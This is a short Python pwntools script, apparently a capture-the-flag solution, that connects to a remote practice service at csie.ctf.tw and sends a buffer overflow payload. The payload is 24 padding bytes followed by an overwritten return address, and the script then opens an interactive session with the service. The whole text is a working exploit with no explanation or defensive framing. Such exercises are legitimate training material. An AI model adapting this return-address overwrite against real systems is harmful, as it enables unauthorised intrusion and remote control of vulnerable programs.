from pwn import *
r = remote('csie.ctf.tw',10120)
r.send('123456789012345678901234\x66\x05\x40\x00\x00\x00\x00\x00\n')
r.interactive()